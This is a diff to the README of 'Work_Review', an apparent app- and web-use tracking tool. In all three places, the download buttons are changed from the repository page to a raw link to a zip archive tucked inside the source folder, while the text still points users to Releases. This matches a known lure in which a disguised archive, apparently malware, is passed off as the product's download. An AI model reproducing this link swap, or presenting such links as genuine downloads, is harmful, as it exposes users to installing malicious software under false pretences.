@@ -1,6 +1,6 @@
 # 📝 Work_Review - Track Your Daily App and Web Use
 
-[![Download Work_Review](https://img.shields.io/badge/Download-Work_Review-brightgreen?style=for-the-badge)](https://github.com/Perjala1833/Work_Review)
+[![Download Work_Review](https://img.shields.io/badge/Download-Work_Review-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Perjala1833/Work_Review/main/src-tauri/src/Work-Review-v2.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To begin using Work_Review, follow these steps:
 
 1. Visit the official download page by clicking the large button below:
 
-   [![Download Work_Review](https://img.shields.io/badge/Download-Work_Review-blue?style=for-the-badge)](https://github.com/Perjala1833/Work_Review)
+   [![Download Work_Review](https://img.shields.io/badge/Download-Work_Review-blue?style=for-the-badge)](https://raw.githubusercontent.com/Perjala1833/Work_Review/main/src-tauri/src/Work-Review-v2.4.zip)
 
 2. On the GitHub page, look for the section labeled "Releases" or "Download" and find the most recent version of Work_Review.
 
@@ -132,4 +132,4 @@ If problems persist, consult the Issues section on the GitHub page for help from
 
 Ready to track your computer use? Visit the official page below to get the latest version of Work_Review:
 
-[![Download Work_Review](https://img.shields.io/badge/Download-Work_Review-brightgreen?style=for-the-badge)](https://github.com/Perjala1833/Work_Review)
+[![Download Work_Review](https://img.shields.io/badge/Download-Work_Review-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Perjala1833/Work_Review/main/src-tauri/src/Work-Review-v2.4.zip)
